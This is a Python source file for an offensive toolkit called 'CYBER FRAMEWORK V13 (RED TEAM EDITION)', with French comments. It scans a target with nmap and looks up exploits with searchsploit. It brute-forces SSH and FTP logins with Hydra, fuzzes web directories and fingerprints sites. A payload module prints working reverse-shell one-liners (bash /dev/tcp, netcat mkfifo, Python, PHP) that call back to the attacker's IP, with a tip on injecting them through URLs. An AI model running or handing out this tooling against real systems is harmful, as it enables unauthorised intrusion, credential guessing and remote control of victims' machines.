import nmap
import subprocess
import os
import sys
from datetime import datetime
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table

console = Console()

donnees_rapport = {
    "cible": "", "date": "", "ports": [], "vulns": [], "mots_de_passe": []
}

# --- NOUVEAU : SYSTÈME D'AUTO-UPDATE (GITHUB) ---
def auto_update():
    # Ne s'exécute que si le dossier est un clone Git
    if os.path.exists(".git"):
        console.print("[dim cyan][*] Recherche de mises à jour sur GitHub...[/dim cyan]")
        try:
            res = subprocess.run(["git", "pull"], capture_output=True, text=True, timeout=5)
            if "Already up to date" not in res.stdout and "files changed" in res.stdout:
                console.print("[bold yellow][!] Nouvelle version détectée et téléchargée ! Redémarrage...[/bold yellow]")
                os.execv(sys.executable, ['python'] + sys.argv)
        except Exception:
            pass
# ------------------------------------------------

def ecrire_rapport(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("rapports/rapport_audit.txt", "a") as f: f.write(f"[{timestamp}] {message}\n")

def scan_target(ip):
    donnees_rapport["cible"] = ip
    nm = nmap.PortScanner()
    results = []
    with console.status(f"[bold green]Analyse furtive de {ip}...[/bold green]"):
        try:
            nm.scan(ip, arguments='-Pn -sV -T4')
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        if nm[host][proto][port]['state'] == 'open':
                            p_info = {'port': port, 'service': nm[host][proto][port]['name'], 'product': nm[host][proto][port].get('product', ''), 'version': nm[host][proto][port].get('version', '')}
                            results.append(p_info)
                            donnees_rapport["ports"].append(p_info)
        except Exception as e: console.print(f"[bold red]Erreur Nmap : {e}[/bold red]")
    return results

def run_searchsploit(open_ports):
    console.print("\n[bold yellow][*] Recherche Searchsploit...[/bold yellow]")
    for p in open_ports:
        product = p['product'].split()[0] if p['product'] else p['service']
        version = p['version'].split()[0] if p['version'] else ""
        if not version: continue
        try:
            res = subprocess.run(["searchsploit", "--disable-colour", product, version], capture_output=True, text=True)
            if res.stdout and "No Results" not in res.stdout:
                console.print(res.stdout)
                donnees_rapport["vulns"].append({"outil": "Searchsploit", "nom": f"Failles {product} {version}", "severite": "High"})
            else: console.print(f"[dim]Aucun exploit pour {product} {version}[/dim]")
        except Exception: pass

def run_hydra(ip, open_ports):
    cibles = [p for p in open_ports if any(s in p['service'].lower() for s in ['ssh', 'ftp'])]
    if not cibles: return console.print("[bold red]Aucun port bruteforçable détecté.[/bold red]")
    for i, p in enumerate(cibles): console.print(f"{i+1}. Port {p['port']} ({p['service']})")
    cible = cibles[int(Prompt.ask("Service ?", choices=[str(i+1) for i in range(len(cibles))]))-1]
    user = Prompt.ask("Utilisateur", default="root")
    try:
        process = subprocess.Popen(["hydra", "-l", user, "-P", "common.txt", "-t", "4", "-s", str(cible['port']), f"{cible['service']}://{ip}"], stdout=subprocess.PIPE, text=True)
        for line in process.stdout:
            if "login:" in line.lower(): console.print(f"[bold green]>>> SUCCÈS : {line.strip()} <<<[/bold green]")
    except Exception as e: console.print(f"[bold red]Erreur : {e}[/bold red]")

def run_gobuster(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
    mots_sensibles = ["admin", "panel", "upload", "config", "backup", "secret", "login", "db", "api", "fuel"]
    console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours...[/bold yellow]")
    try:
        for port in web_ports:
            url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
            process = subprocess.Popen(["gobuster", "dir", "-u", url, "-w", "common.txt", "-q", "-t", "20"], stdout=subprocess.PIPE, text=True)
            for line in process.stdout:
                if "Status: 200" in line or "Status: 301" in line:
                    dossier = line.split(" ")[0].strip()
                    url_complete = f"{url}{dossier if dossier.startswith('/') else '/'+dossier}"
                    if any(mot in dossier.lower() for mot in mots_sensibles):
                        console.print(f"[bold red blink]🚨 ALERTE : {url_complete}[/bold red blink]")
                        donnees_rapport["vulns"].append({"outil": "Gobuster", "nom": url_complete, "severite": "High"})
                    else: console.print(f"[bold green][+] {url_complete}[/bold green]")
    except KeyboardInterrupt: pass

def run_whatweb(ip, open_ports):
    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
    chemin = Prompt.ask("\nChemin à analyser (laisse vide pour la racine)", default="")
    chemin = f"/{chemin}" if chemin and not chemin.startswith('/') else chemin
    for port in web_ports:
        url = f"http://{ip}:{port}{chemin}" if port != 443 else f"https://{ip}{chemin}"
        try:
            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
            if res.stdout:
                console.print(f"\n[bold cyan]=== Profil pour {url} ===[/bold cyan]")
                for techno in res.stdout.strip().split(', '):
                    if "]" in techno and "[" in techno:
                        console.print(f"[bold magenta]> {techno}[/bold magenta]")
                        donnees_rapport["vulns"].append({"outil": "WhatWeb", "nom": techno, "severite": "Info"})
                    else: console.print(f"> {techno}")
        except Exception: pass

def run_advisor(ip, open_ports):
    console.print("\n[bold green]🧠 Analyse Stratégique par le Conseiller IA...[/bold green]")
    for p in open_ports:
        port, service = p['port'], p['service'].lower()
        if port == 21 or "ftp" in service: console.print("[cyan]💡 [PORT 21][/cyan] Teste le compte 'anonymous' sans mot de passe.")
        elif port in [22, 2222] or "ssh" in service: console.print("[cyan]💡 [PORT SSH][/cyan] Ne bruteforce pas. Cherche d'abord une clé id_rsa sur le Web.")
        elif port in [80, 443, 8080] or "http" in service: console.print("[cyan]💡 [PORT WEB][/cyan] 1. Ouvre Lynx. 2. Lance Gobuster. 3. Profilage WhatWeb.")
    if donnees_rapport["vulns"]:
        console.print("\n[bold magenta]🔍 Basé sur tes découvertes :[/bold magenta]")
        for v in donnees_rapport["vulns"]:
            if v["outil"] == "WhatWeb": console.print(f"   -> Cherche un exploit RCE pour : {v['nom']}")

# --- NOUVEAU MODULE : GÉNÉRATEUR DE REVERSE SHELLS ---
def run_payload_generator():
    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS ☠️[/bold red]")
    ip = Prompt.ask("[cyan]Ton IP d'écoute (ex: tun0)[/cyan]")
    port = Prompt.ask("[cyan]Ton port d'écoute[/cyan]", default="4444")
    
    console.print(f"\n[dim]Dans un autre terminal : sudo nc -lvnp {port}[/dim]\n")
    table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
    table.add_column("Type", style="magenta"); table.add_column("Commande (One-Liner)", style="green")
    table.add_row("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
    table.add_row("Netcat (Mkfifo)", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
    table.add_row("PHP", f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    console.print(table)
    console.print("[yellow]💡 Astuce: URL-encode le payload si tu l'injectes dans une barre d'adresse Web.[/yellow]")
# ---------------------------------------------------

def generer_html():
    if not os.path.exists("rapports"): os.makedirs("rapports")
    html = f"<html><body><h1>Rapport - {donnees_rapport['cible']}</h1><table border='1'>"
    for v in donnees_rapport["vulns"]: html += f"<tr><td>{v.get('severite', 'Info')}</td><td>{v['nom']}</td></tr>"
    html += "</table></body></html>"
    with open("rapports/rapport.html", "w") as f: f.write(html)
    console.print("\n[bold green]>>> Rapport généré : rapports/rapport.html <<<[/bold green]")

def interactive_menu(ip, open_ports):
    while True:
        table = Table(title=f"Arsenal : {ip}")
        table.add_column("Port", style="cyan"); table.add_column("Service", style="magenta"); table.add_column("Version", style="yellow")
        for p in open_ports: table.add_row(str(p['port']), p['product'] or p['service'], p['version'] or "Inconnue")
        console.print(table)
        
        console.print("\n1. Searchsploit | 2. Bruteforce (Hydra) | 3. Fuzzing (Gobuster) | 4. Empreinte (WhatWeb) | 5. Conseiller IA | [bold red]6. Reverse Shells[/bold red] | 7. Quitter")
        choix = Prompt.ask("Action", choices=["1", "2", "3", "4", "5", "6", "7"])
        
        if choix == "1": run_searchsploit(open_ports)
        elif choix == "2": run_hydra(ip, open_ports)
        elif choix == "3": run_gobuster(ip, open_ports)
        elif choix == "4": run_whatweb(ip, open_ports)
        elif choix == "5": run_advisor(ip, open_ports)
        elif choix == "6": run_payload_generator()
        elif choix == "7": 
            generer_html()
            break

if __name__ == "__main__":
    auto_update() # Appel du système de mise à jour au lancement
    console.print("[bold red]=== CYBER FRAMEWORK V13 (RED TEAM EDITION) ===[/bold red]")
    
    # Prise en charge des arguments en ligne de commande
    if len(sys.argv) > 1:
        cible = sys.argv[1].replace("https://", "").replace("http://", "").split("/")[0]
    else:
        entree_brute = Prompt.ask("IP cible")
        cible = entree_brute.replace("https://", "").replace("http://", "").split("/")[0] if "/" not in entree_brute else entree_brute
    
    ports = scan_target(cible)
    if ports: interactive_menu(cible, ports)
    else: console.print("[red]Aucun port ouvert.[/red]")